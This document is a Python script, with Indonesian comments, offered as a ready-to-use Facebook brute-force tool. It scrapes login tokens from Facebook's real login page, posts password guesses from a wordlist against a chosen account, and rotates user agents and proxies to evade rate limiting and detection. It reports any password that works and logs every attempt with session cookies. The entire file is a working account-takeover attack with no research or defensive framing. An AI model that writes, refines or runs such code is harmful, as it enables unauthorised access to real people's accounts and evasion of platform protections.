import requests
from bs4 import BeautifulSoup
import random
import time
import logging
import os

# --- Konfigurasi Logging ---
LOG_FILE = "facebook_bruteforce.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
console_log = logging.getLogger("console")

# --- User-Agent Pool ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def get_fb_login_tokens(session, login_url):
    """
    Scrape dynamic tokens (lsd, jazoest, etc) from Facebook login page.
    """
    resp = session.get(login_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    tokens = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        value = inp.get("value", "")
        if name in ("lsd", "jazoest", "_fb_noscript", "m_ts", "li"):
            tokens[name] = value
    return tokens

def is_fb_login_success(response, session):
    """
    Check if Facebook login is successful by:
    - Checking for 'c_user' cookie
    - Absence of login form
    - No error message
    """
    # Check for c_user cookie
    if "c_user" in session.cookies.get_dict():
        return True
    # Check if login form is gone and no error message
    if "login_form" not in response.text and "The password you’ve entered is incorrect" not in response.text:
        return True
    return False

def load_list_from_file(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def facebook_bruteforce(username, password_list, proxies=None, user_agents=None, delay=1.0, verbose=True):
    login_url = "https://www.facebook.com/login.php"
    results = []
    for password in password_list:
        session = requests.Session()
        # Randomize User-Agent
        if user_agents:
            session.headers["User-Agent"] = random.choice(user_agents)
        else:
            session.headers["User-Agent"] = USER_AGENTS[0]
        # Set proxy if available
        if proxies:
            proxy = random.choice(proxies)
            session.proxies = {"http": proxy, "https": proxy}
        # Step 1: GET login page & scrape tokens
        try:
            tokens = get_fb_login_tokens(session, login_url)
        except Exception as e:
            msg = f"[ERROR] Failed to scrape tokens: {e}"
            if verbose:
                print(msg)
            logging.error(msg)
            continue
        # Step 2: Prepare POST data
        data = {
            "email": username,
            "pass": password,
            **tokens
        }
        # Step 3: POST login
        try:
            resp = session.post(login_url, data=data, allow_redirects=True)
        except Exception as e:
            msg = f"[ERROR] Request failed: {e}"
            if verbose:
                print(msg)
            logging.error(msg)
            continue
        # Step 4: Check success
        success = is_fb_login_success(resp, session)
        log_detail = {
            "username": username,
            "password": password,
            "status_code": resp.status_code,
            "success": success,
            "url_after": resp.url,
            "cookies": session.cookies.get_dict(),
            "response_length": len(resp.text)
        }
        logging.info(f"ATTEMPT: {log_detail}")
        if verbose:
            if success:
                print(f"[SUCCESS] {username}:{password}")
            else:
                print(f"[FAIL] {username}:{password}")
        results.append(log_detail)
        if success:
            break
        time.sleep(delay)
    return results

def main():
    print("=== Facebook Brute Force (Robust, Siap Pakai) ===")
    username = input("Facebook Username/Email/Phone: ").strip()
    wordlist_path = input("Path to password wordlist file: ").strip()
    if not os.path.isfile(wordlist_path):
        print("Wordlist file not found!")
        return
    password_list = load_list_from_file(wordlist_path)

    proxy_path = input("Path to proxy file (optional, Enter to skip): ").strip()
    proxies = []
    if proxy_path:
        if os.path.isfile(proxy_path):
            proxies = load_list_from_file(proxy_path)
        else:
            print("Proxy file not found, skipping proxies.")

    delay = input("Delay between requests in seconds (default 1.0): ").strip()
    try:
        delay = float(delay) if delay else 1.0
    except Exception:
        delay = 1.0

    print(f"Starting brute force for {username} with {len(password_list)} passwords...")
    results = facebook_bruteforce(
        username=username,
        password_list=password_list,
        proxies=proxies,
        user_agents=USER_AGENTS,
        delay=delay,
        verbose=True
    )
    found = False
    for res in results:
        if res["success"]:
            print(f"\n[SUCCESS] Password found: {res['username']}:{res['password']}")
            found = True
            break
    if not found:
        print("\n[FAIL] No valid password found for this account.")
    print(f"\nLog saved to: {LOG_FILE}")

if __name__ == "__main__":
    main()